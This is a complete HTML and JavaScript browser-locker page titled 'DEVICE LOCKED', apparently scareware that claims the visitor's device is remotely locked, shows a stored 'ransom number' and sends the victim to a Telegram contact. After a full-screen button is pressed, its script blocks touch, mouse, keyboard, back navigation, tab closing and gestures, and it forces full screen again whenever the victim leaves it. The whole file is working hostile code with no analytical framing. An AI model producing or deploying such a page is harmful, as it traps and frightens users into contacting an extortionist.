<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>🔒 DEVICE LOCKED</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #000000;
            touch-action: none;
            overscroll-behavior: none;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        .lock-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 20px red); animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
        h1 { color: #ff4444; font-size: 32px; margin-bottom: 10px; letter-spacing: 2px; }
        .sub { color: #ff8888; font-size: 14px; margin-bottom: 30px; }
        .card {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 25px;
            border: 1px solid rgba(255,68,68,0.3);
        }
        .number-box {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 12px;
            margin: 15px 0;
            font-size: 28px;
            font-weight: bold;
            font-family: monospace;
            color: #ff9800;
            letter-spacing: 3px;
            border: 1px solid #ff4444;
        }
        .contact-btn {
            display: inline-block;
            padding: 14px 30px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            margin-top: 15px;
            transition: 0.2s;
        }
        .contact-btn:active { transform: scale(0.95); }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #666;
            opacity: 0.6;
        }
        .footer a {
            color: #ff6666;
            text-decoration: none;
        }
        .warning {
            font-size: 12px;
            color: #ff6666;
            opacity: 0.7;
            margin-top: 15px;
        }
        .fullscreen-btn {
            display: inline-block;
            padding: 14px 35px;
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
            transition: 0.2s;
            box-shadow: 0 0 30px rgba(76,175,80,0.4);
            letter-spacing: 1px;
        }
        .fullscreen-btn:active { transform: scale(0.95); }
        .fullscreen-btn.hidden { display: none; }
        /* Disable all pointer events on everything except buttons */
        .no-click { pointer-events: none; }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="lock-icon">💀</div>
        <h1>🔒 DEVICE LOCKED</h1>
        <div class="sub">Your device has been remotely locked</div>

        <!-- FULL SCREEN BUTTON -->
        <button class="fullscreen-btn" id="fsBtn">🖥️ FULL SCREEN</button>

        <div class="card">
            <p style="color:#ff8888; font-size:13px;">Your Unique Unlock Number</p>
            <div class="number-box" id="userNumber">----</div>
            <p style="font-size:12px; color:#666;">Contact admin with this number to unlock</p>
            <a href="#" class="contact-btn" id="contactBtn">📞 Contact Admin</a>
        </div>
        <div class="warning">⚠️ Do not close this screen. Contact admin immediately.</div>
        <div class="footer">👑 Owner: <a href="#" id="ownerLink">@notxsatvir</a></div>
    </div>
    <script>
        // ========== GENERATE NUMBER ==========
        function generateNumber() {
            return Math.floor(100000 + Math.random() * 900000).toString();
        }

        let userNumber = localStorage.getItem('satvir_ransom_number') || generateNumber();
        localStorage.setItem('satvir_ransom_number', userNumber);
        document.getElementById('userNumber').textContent = userNumber;

        // ========== FULLSCREEN FUNCTION ==========
        let isFullscreen = false;
        let lockEnabled = false;

        function enterFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
            isFullscreen = true;
            document.getElementById('fsBtn').classList.add('hidden');
            enableLock();
        }

        document.getElementById('fsBtn').addEventListener('click', function() {
            enterFullscreen();
        });

        // ========== ENABLE COMPLETE LOCK ==========
        function enableLock() {
            if (lockEnabled) return;
            lockEnabled = true;

            // ===== BLOCK NAVIGATION BAR (GESTURE + 3-BUTTON) =====
            // Fullscreen already hides navigation bar
            // But we also block any interaction

            // ===== BLOCK ALL TOUCH EVENTS COMPLETELY =====
            document.addEventListener('touchstart', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { passive: false, capture: true });

            document.addEventListener('touchmove', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { passive: false, capture: true });

            document.addEventListener('touchend', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { passive: false, capture: true });

            document.addEventListener('touchcancel', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { passive: false, capture: true });

            // ===== BLOCK ALL MOUSE EVENTS =====
            document.addEventListener('mousedown', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { capture: true });

            document.addEventListener('mouseup', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { capture: true });

            document.addEventListener('click', function(e) {
                if (e.target.id === 'contactBtn' || e.target.id === 'ownerLink') {
                    return;
                }
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { capture: true });

            // ===== BLOCK KEYBOARD =====
            document.addEventListener('keydown', function(e) {
                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab'];
                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                    e.preventDefault();
                    e.stopPropagation();
                    alert('🔒 Action blocked! Contact admin.');
                    return false;
                }
            }, { capture: true });

            // ===== BLOCK BACK BUTTON =====
            for(let i = 0; i < 20; i++) {
                window.history.pushState(null, '', window.location.href);
            }
            window.addEventListener('popstate', function() {
                for(let i = 0; i < 20; i++) {
                    window.history.pushState(null, '', window.location.href);
                }
                alert('🔒 Cannot exit! Contact admin.');
            });

            // ===== BLOCK TAB CLOSE =====
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '🔒 Device locked! Contact admin to exit.';
                return '🔒 Device locked! Contact admin to exit.';
            });

            // ===== BLOCK CONTEXT MENU =====
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            }, { capture: true });

            // ===== BLOCK WHEEL/SCROLL =====
            document.addEventListener('wheel', function(e) {
                e.preventDefault();
            }, { passive: false, capture: true });

            // ===== BLOCK GESTURE EVENTS =====
            document.addEventListener('gesturestart', function(e) {
                e.preventDefault();
                return false;
            }, { passive: false, capture: true });

            document.addEventListener('gesturechange', function(e) {
                e.preventDefault();
                return false;
            }, { passive: false, capture: true });

            document.addEventListener('gestureend', function(e) {
                e.preventDefault();
                return false;
            }, { passive: false, capture: true });

            // ===== BLOCK VISIBILITY CHANGE (screen off detection) =====
            document.addEventListener('visibilitychange', function(e) {
                if (document.hidden) {
                    // If user tries to lock screen, keep it alive
                    // Force wake lock
                    if (navigator.wakeLock) {
                        navigator.wakeLock.request('screen').catch(() => {});
                    }
                }
            });

            // ===== REQUEST SCREEN WAKE LOCK =====
            if (navigator.wakeLock) {
                navigator.wakeLock.request('screen').catch(() => {});
            }

            // ===== CONTINUOUS HISTORY PUSH =====
            setInterval(function() {
                if (lockEnabled) {
                    window.history.pushState(null, '', window.location.href);
                }
            }, 200);

            // ===== BLOCK NAVIGATION BAR PULL-UP =====
            // We need to prevent any touch that starts from bottom
            document.addEventListener('touchstart', function(e) {
                const touch = e.touches[0];
                const screenHeight = window.innerHeight;
                // If touch starts from very bottom (navigation bar area)
                if (touch.clientY > screenHeight - 50) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, { passive: false, capture: true });

            console.log('🔒 Full lock enabled!');
            console.log('📱 Navigation bar blocked!');
        }

        // ========== CHECK UNLOCK ==========
        function checkUnlock() {
            const number = localStorage.getItem('satvir_ransom_number');
            if (number && localStorage.getItem('satvir_unlock_' + number) === 'true') {
                localStorage.removeItem('satvir_unlock_' + number);
                let users = JSON.parse(localStorage.getItem('satvir_locked_users') || '[]');
                users = users.filter(u => u !== number);
                localStorage.setItem('satvir_locked_users', JSON.stringify(users));
                alert('✅ Device unlocked! Closing...');
                setTimeout(function() {
                    window.close();
                    window.location.href = 'about:blank';
                }, 500);
            }
        }

        // ========== CONTACT ADMIN ==========
        document.getElementById('contactBtn').addEventListener('click', function(e) {
            e.stopPropagation();
            window.open('https://t.me/notxsatvir', '_blank');
        });

        document.getElementById('ownerLink').addEventListener('click', function(e) {
            e.stopPropagation();
            window.open('https://t.me/notxsatvir', '_blank');
        });

        // ========== CHECK UNLOCK EVERY 2 SECONDS ==========
        setInterval(checkUnlock, 2000);

        // ========== PREVENT NAVIGATION BAR PULL ==========
        // Force fullscreen on any resize/rotation
        window.addEventListener('resize', function() {
            if (lockEnabled && !document.fullscreenElement && !document.webkitFullscreenElement) {
                enterFullscreen();
            }
        });

        // Re-enter fullscreen if exited
        document.addEventListener('fullscreenchange', function() {
            if (lockEnabled && !document.fullscreenElement && !document.webkitFullscreenElement) {
                enterFullscreen();
            }
        });

        console.log('🔒 Device locked! Number:', userNumber);
        console.log('📞 Contact @notxsatvir to unlock');
        console.log('🖥️ Click "FULL SCREEN" to lock');
        console.log('🚫 Navigation bar blocked!');
    </script>
</body>
</html>
